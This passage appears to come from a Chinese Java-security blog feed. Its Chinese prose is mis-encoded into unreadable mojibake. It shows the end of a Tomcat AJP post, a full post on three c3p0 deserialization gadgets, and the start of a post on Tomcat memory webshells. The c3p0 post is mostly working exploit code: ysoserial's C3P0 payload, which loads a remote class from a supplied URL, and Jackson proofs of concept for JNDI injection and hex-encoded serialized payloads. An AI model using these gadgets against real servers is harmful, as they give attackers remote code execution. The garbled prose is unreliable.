<h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>æ–‡ä¸­åˆ†æçš„æ˜¯æœ€ç†æƒ³çš„æƒ…å†µå®é™…åˆ©ç”¨ä¼šå—åˆ°è¿‡æ»¤å™¨æˆ–æ˜¯æ¡†æ¶çš„å½±å“å…³äºè¿™éƒ¨åˆ†å†…å®¹å¯ä»¥çœ‹<a href="https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/">å¦‚ä½•æ›´åŠ ç²¾ç¡®çš„æ£€æµ‹Tomcat AJPæ–‡ä»¶åŒ…å«æ¼æ´(CVE-2020-1938)</a></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/t/7325">Tomcat Ajpåè®®æ–‡ä»¶åŒ…å«æ¼æ´åˆ†æ</a><br><a href="https://xz.aliyun.com/t/7510">tomcatå¹½çµçŒ«åˆ†æ</a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>c3p0çš„ä¸‰ä¸ªgadget</title>
    <url>/2020/04/18/c3p0%E7%9A%84%E4%B8%89%E4%B8%AAgadget/</url>
    <content><![CDATA[<!-- é™¤äº†å¸¸è§çš„http baseä¹‹å¤–ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹c3p0å¯ä»¥ä½¿ç”¨jndiå’Œhexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨æ¥è¿›è¡Œrceã€‚ -->
<!-- more -->

<p>c3p0æœ‰ä¸‰ç§æ–¹å¼getshell</p>
<ul>
<li>http base</li>
<li>jndi</li>
<li>hexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨</li>
</ul>
<p>http baseé€‚ç”¨äºåŸç”Ÿååºåˆ—åŒ–ï¼Œåé¢ä¸¤ç§é€‚ç”¨äºå…¶ä»–è§£ç»„ç±»å‹çš„ååºåˆ—åŒ–ã€‚å…·ä½“æ¥è®²ï¼Œjndié€‚ç”¨äºjdk8u191ä»¥ä¸‹æ”¯æŒreferenceæƒ…å†µï¼Œhexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨é€‚ç”¨äºä¸å‡ºç½‘ä½†æ˜¯ç›®æ ‡ä¾èµ–æœ‰gadgeté“¾çš„æƒ…å†µã€‚</p>
<h2 id="http-base"><a href="#http-base" class="headerlink" title="http base"></a>http base</h2><p>c3p0 payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.PoolBackedDataSource;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * com.sun.jndi.rmi.registry.RegistryContext-&gt;lookup</span></span><br><span class="line"><span class="comment"> * com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized-&gt;getObject</span></span><br><span class="line"><span class="comment"> * com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase-&gt;readObject</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Arguments:</span></span><br><span class="line"><span class="comment"> * - base_url:classname</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Yields:</span></span><br><span class="line"><span class="comment"> * - Instantiation of remotely loaded class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@PayloadTest</span> ( harness=<span class="string">"ysoserial.test.payloads.RemoteClassLoadingTest"</span> )</span><br><span class="line"><span class="meta">@Dependencies</span>( &#123; <span class="string">"com.mchange:c3p0:0.9.5.2"</span> ,<span class="string">"com.mchange:mchange-commons-java:0.2.11"</span>&#125; )</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.MBECHLER &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C3P0</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Command format is: &lt;base_url&gt;:&lt;classname&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String url = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        String className = command.substring(sep + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolSource</span> <span class="keyword">implements</span> <span class="title">ConnectionPoolDataSource</span>, <span class="title">Referenceable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String className;</span><br><span class="line">        <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PoolSource</span> <span class="params">( String className, String url )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.className = className;</span><br><span class="line">            <span class="keyword">this</span>.url = url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span> <span class="params">()</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Reference(<span class="string">"exploit"</span>, <span class="keyword">this</span>.className, <span class="keyword">this</span>.url);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> PrintWriter <span class="title">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLoginTimeout</span> <span class="params">( <span class="keyword">int</span> seconds )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(C3P0<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>connectionPoolDataSourceæ˜¯PoolSourceï¼Œä½†æ˜¯PoolSourceæ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œæ‰€ä»¥ä¼šåœ¨PoolBackedDataSourceæ—¶è¿›å…¥åˆ°catchå—ä¸­ã€‚<br><img src="1586157998304-98f88cb3-35d4-4b17-b735-a381447d3604.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&name=image.png&originHeight=596&originWidth=2822&size=175522&status=done&style=none&width=1411" alt="image.png"></p>
<p><img src="1586157880994-1fe1db61-f3a5-45a3-a591-4af5ef5cee26.png#align=left&display=inline&height=628&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1256&originWidth=1514&size=146157&status=done&style=none&width=757" alt="image.png"></p>
<p><img src="1586157739966-f17e2977-5809-47de-ae93-56a634a2ae63.png#align=left&display=inline&height=390&margin=%5Bobject%20Object%5D&name=image.png&originHeight=780&originWidth=2348&size=199375&status=done&style=none&width=1174" alt="image.png"></p>
<p>catchå—ä¸­è°ƒç”¨indirector.indirectForm(this.connectionPoolDataSource)ä¼šæŠŠReferenceableç±»å‹æ”¾åˆ°ReferenceSerializedä¸­å¹¶è¿›è¡Œåºåˆ—åŒ–ã€‚<br><img src="1586158218862-65b4fe36-0548-40a6-9243-67d6716739ed.png#align=left&display=inline&height=350&margin=%5Bobject%20Object%5D&name=image.png&originHeight=700&originWidth=2474&size=144888&status=done&style=none&width=1237" alt="image.png"></p>
<p>åœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨ReferenceSerializedçš„getObjectæ–¹æ³•ï¼Œå‘http baseè¯·æ±‚ç±»<br><img src="1586158470733-c79c8427-b1d3-482d-8082-c8b9c4e4b3b1.png#align=left&display=inline&height=194&margin=%5Bobject%20Object%5D&name=image.png&originHeight=388&originWidth=2014&size=79716&status=done&style=none&width=1007" alt="image.png"></p>
<p><img src="1586158529333-efc7783e-8941-45de-9242-b6b5043e49a9.png#align=left&display=inline&height=485&margin=%5Bobject%20Object%5D&name=image.png&originHeight=970&originWidth=2208&size=195296&status=done&style=none&width=1104" alt="image.png"></p>
<p><img src="1586158599877-ad23b7dc-9541-416e-8563-ea92e0a0f47c.png#align=left&display=inline&height=387&margin=%5Bobject%20Object%5D&name=image.png&originHeight=774&originWidth=2164&size=167546&status=done&style=none&width=1082" alt="image.png"></p>
<h2 id="jndi-æ³¨å…¥"><a href="#jndi-æ³¨å…¥" class="headerlink" title="jndi æ³¨å…¥"></a>jndi æ³¨å…¥</h2><p>PoolBackedDataSourceBase<br><img src="1586157023673-1ba52779-d0e1-4e31-a9e3-a92873f39dfe.png#align=left&display=inline&height=470&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=2002&size=188137&status=done&style=none&width=1001" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatePoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String poc = <span class="string">"&#123;\"object\":[\"com.mchange.v2.c3p0.JndiRefForwardingDataSource\",&#123;\"jndiName\":\"rmi://localhost:8088/Exploit\", \"loginTimeout\":0&#125;]&#125;"</span>;</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        objectMapper.readValue(poc, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] bArray, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            String sTemp = Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><img src="1586746951558-7748fb17-b819-4eaa-9aa9-edff94e8bd90.png#align=left&display=inline&height=243&margin=%5Bobject%20Object%5D&name=image.png&originHeight=486&originWidth=1944&size=127935&status=done&style=none&width=972" alt="image.png"></p>
<p><img src="1586747039311-88d990d3-4b87-4570-b33b-b32b0e9bbcd5.png#align=left&display=inline&height=256&margin=%5Bobject%20Object%5D&name=image.png&originHeight=512&originWidth=2204&size=101206&status=done&style=none&width=1102" alt="image.png"></p>
<p><img src="1586747042329-d08d3f11-8212-4e27-b5db-692d2fd316af.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&name=image.png&originHeight=488&originWidth=1320&size=68944&status=done&style=none&width=746" alt="image.png"></p>
<p><img src="1586747066747-72ba5789-3d66-407b-a184-8b672916fe76.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=560&originWidth=2200&size=145105&status=done&style=none&width=1100" alt="image.png"></p>
<h2 id="hexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨"><a href="#hexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨" class="headerlink" title="hexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨"></a>hexåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨</h2><p><img src="1586157043057-ea21e78c-b10c-4f83-9dd5-198c1a5b6ae1.png#align=left&display=inline&height=451&margin=%5Bobject%20Object%5D&name=image.png&originHeight=902&originWidth=2004&size=179448&status=done&style=none&width=1002" alt="image.png"><br><img src="1586157060893-23a3eaed-43e6-43b6-89b5-21803abfe30f.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=670&originWidth=1976&size=153585&status=done&style=none&width=988" alt="image.png"></p>
<p>åœ¨ä¸€äº›éåŸç”Ÿçš„ååºåˆ—åŒ–ï¼ˆå¦‚jacksonï¼‰çš„æƒ…å†µä¸‹ï¼Œc3p0å¯ä»¥åšåˆ°ä¸å‡ºç½‘åˆ©ç”¨ã€‚å…¶åŸç†æ˜¯åˆ©ç”¨jacksonçš„ååºåˆ—åŒ–æ—¶è°ƒç”¨userOverridesAsStringçš„setterï¼Œåœ¨setterä¸­è¿è¡Œè¿‡ç¨‹ä¸­ä¼šæŠŠä¼ å…¥çš„ä»¥HexAsciiSerializedMapå¼€å¤´çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç å¹¶è§¦å‘åŸç”Ÿååºåˆ—åŒ–ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatePoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        InputStream in = <span class="keyword">new</span> FileInputStream(<span class="string">"/Users/cengsiqi/Desktop/test.ser"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] data = toByteArray(in);</span><br><span class="line">        in.close();</span><br><span class="line">        String HexString = bytesToHexString(data, data.length);</span><br><span class="line">        String poc = <span class="string">"&#123;\"object\":[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",&#123;\"userOverridesAsString\":\"HexAsciiSerializedMap:"</span>+ HexString + <span class="string">";\"&#125;]&#125;"</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        objectMapper.readValue(poc, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] bArray, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        StringBuffer sb = <span class="keyword">new</span> StringBuffer(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            String sTemp = Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>ç®€å•è·Ÿè¸ªä¸€ä¸‹ï¼Œè¿›å…¥setteræ–¹æ³•ã€‚<br><img src="1586744313296-ca6b14b1-4297-4f09-a344-563ba85cf168.png#align=left&display=inline&height=363&margin=%5Bobject%20Object%5D&name=image.png&originHeight=726&originWidth=2460&size=210573&status=done&style=none&width=1230" alt="image.png"></p>
<p>ç”±parseUserOverridesAsStringå¯¹å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†<br><img src="1586744361091-dae2b1e6-349a-4863-8c80-bcd9fe960f07.png#align=left&display=inline&height=1332&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1332&originWidth=2568&size=442605&status=done&style=none&width=2568" alt="image.png"></p>
<p>æå–HexAsciiSerializedMapä¹‹åçš„ä¸œè¥¿<br><img src="1586744421955-161d66ba-096b-4df9-97a4-9bb506f94f07.png#align=left&display=inline&height=185&margin=%5Bobject%20Object%5D&name=image.png&originHeight=370&originWidth=2528&size=123596&status=done&style=none&width=1264" alt="image.png"></p>
<p>æœ€åç”±fromByteArrayä¸­çš„deserializeFromByteArrayè¿›è¡Œååºåˆ—åŒ–<br><img src="1586744477494-4055d369-1a34-49f3-9836-091d4471928c.png#align=left&display=inline&height=100&margin=%5Bobject%20Object%5D&name=image.png&originHeight=200&originWidth=2244&size=67588&status=done&style=none&width=1122" alt="image.png"></p>
<p><img src="1586744495756-bf0a1af2-742b-49ad-90e5-e926633529be.png#align=left&display=inline&height=124&margin=%5Bobject%20Object%5D&name=image.png&originHeight=248&originWidth=2250&size=65436&status=done&style=none&width=1125" alt="image.png"></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcatä¸å‡ºç½‘å›æ˜¾è¿ç»­å‰§ç¬¬å…­é›†</title>
    <url>/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/</url>
    <content><![CDATA[<!-- ç¦»å¤§ç»“å±€åˆè¿›äº†ä¸€æ­¥ -->
<!-- more -->

<p>é¦–å‘äº<a href="https://xz.aliyun.com/t/7535">å…ˆçŸ¥ç¤¾åŒº</a></p>
<h2 id="å‰æƒ…æè¦"><a href="#å‰æƒ…æè¦" class="headerlink" title="å‰æƒ…æè¦"></a>å‰æƒ…æè¦</h2><p>è¿™å‘¨å›é¡¾äº†ä¸€ä¸‹æˆ‘çœ‹åˆ°çš„å‰äººå…³äºtomcatå›æ˜¾å’Œæ— æ–‡ä»¶webshellçš„æ–‡ç« ã€‚å‘ç°å„ä¸ªå¸ˆå‚…çš„æ–¹æ³•å„æœ‰ä¼˜åŠ£ï¼Œä¸‹é¢ç®€å•æ€»ç»“ä¸€ä¸‹ï¼ˆæ€»ç»“ä¸å¯¹çš„åœ°æ–¹è¿˜è¯·å„ä½å¸ˆå‚…æŒ‡å‡ºï¼‰ã€‚</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/198886">åŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶</a>ï¼Œè§‚æ˜Ÿå¤§å“¥çš„æ–‡ç« ï¼Œé€šæ€springï¼Œèƒ½è§£å†³å®æˆ˜åªèƒ½å¤Ÿé‡åˆ°çš„å¤§éƒ¨åˆ†æƒ…å†µäº†ã€‚</li>
<li><a href="https://xz.aliyun.com/t/7348">Tomcatä¸­ä¸€ç§åŠé€šç”¨å›æ˜¾æ–¹æ³•</a>ï¼Œè¿™ç¯‡æ–‡ç« è®²äº†é€šè¿‡åå°„ä¿®æ”¹ApplicationFilterChainå‚æ•°æ¥è®©tomcatå†ä¸‹ä¸€æ¬¡è¯·æ±‚çš„æ—¶å€™åœ¨çº¿ç¨‹ä¸­ç¼“å­˜reqå’Œrespï¼Œä¸è¶³ä¹‹å¤„åœ¨äºshiroæ— æ³•å›æ˜¾ã€‚</li>
<li><a href="https://xz.aliyun.com/t/7388">åŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯</a>ï¼Œé€šè¿‡ä¸Šä¸€ç¯‡çš„æ–¹æ³•è·å–åˆ°reqè¿›ä¸€æ­¥è·å–contextï¼Œç„¶ååŠ¨æ€æ³¨å†Œfilterï¼Œä¸è¶³ä¹‹å¤„åœ¨äºä½¿ç”¨çš„æ˜¯ä¸Šä¸€ç¯‡çš„è·å–reqçš„æ€è·¯æ‰€ä»¥ä¹Ÿæ— æ³•shiroå›æ˜¾ã€‚</li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3">åŸºäºå…¨å±€å‚¨å­˜çš„æ–°æ€è·¯ | Tomcatçš„ä¸€ç§é€šç”¨å›æ˜¾æ–¹æ³•ç ”ç©¶</a>ï¼Œè¿™ç¯‡æ–‡ç« é€šè¿‡currentThread.getContextClassLoader()è·å–StandardContextï¼Œè¿›ä¸€æ­¥è·å–åˆ°responseï¼Œè§£å†³äº†shiroå›æ˜¾çš„é—®é¢˜ï¼Œä¸è¶³åœ¨äºtomcat7ä¸­æ— æ³•è·å–åˆ°StandardContextã€‚</li>
<li><a href="https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA">åŸºäºTomcatæ— æ–‡ä»¶Webshellç ”ç©¶</a>ï¼Œæ€»ç»“ä¸Šé¢æ–‡ç« çš„æ–¹æ³•ï¼Œä¸è¶³ä¹‹å¤„åœ¨äºæ— æ³•è§£å†³tomcat7+shiroçš„é—®é¢˜ã€‚</li>
</ul>
<p>æ‰€ä»¥è¿™é‡Œæå‡ºä¸€ç§æ–°çš„å›æ˜¾æ–¹æ¡ˆè§£å†³ä¸€ä¸‹tomcat7+shiroè¿™ä¸ªé˜´æš—çš„è§’è½ï¼ˆç»æµ‹è¯•tomcat8ä»ç„¶é€‚ç”¨ï¼‰ã€‚<br>æµ‹è¯•ç¯å¢ƒï¼šmacos+tomcat7,8+shiro-simple-web</p>
<h2 id="å†çœ‹register"><a href="#å†çœ‹register" class="headerlink" title="å†çœ‹register"></a>å†çœ‹register</h2><p>åœ¨ä¸Šé¢æåˆ°çš„ç¬¬å››ç¯‡æ–‡ç« ä¸­æåˆ°åŒ…å«æœ‰requestï¼ˆæœ‰äº†requestå°±æœ‰responseï¼‰çš„rpä¼šè¢«å‚¨å­˜åœ¨globalä¸­ï¼Œä½†å…¶å®å†å¾€ä¸‹çœ‹ä¼šå‘ç°rpè¢«æ³¨å†Œè¿›äº†ç»„ä»¶ã€‚<br><img src="1585579573873-fde8907a-d8ea-4418-8fb8-4f2f24c5854b.png#align=left&display=inline&height=413&name=image.png&originHeight=826&originWidth=2868&size=245974&status=done&style=none&width=1434" alt="image.png"><br>æ—¢ç„¶æ³¨å†Œè¿›å»äº†è‚¯å®šå­˜æ”¾åœ¨å“ªé‡Œçš„ï¼Œæ¥ä¸‹æ¥åŠ¨é™ç»“åˆè°ƒä»£ç æ‰¾å°±å¥½äº†ï¼Œä»£ç è·Ÿè¸ªè¿‡äºå†—é•¿è€Œä¸”æˆ‘ä¹Ÿæ²¡ç»†ç»†æ¢ç©¶æ¯ä¸€æ­¥çš„æ„ä¹‰ï¼Œå°±ä¸è£…æ¨¡ä½œæ ·çš„åˆ†æäº†ï¼Œè¿™é‡Œç›´æ¥ç»™ç»“è®ºã€‚<br><img src="1585579952767-ef1b2c0c-0d84-4ec1-953f-89236110b0ab.png#align=left&display=inline&height=645&name=image.png&originHeight=1290&originWidth=2176&size=948160&status=done&style=none&width=1088" alt="image.png"></p>
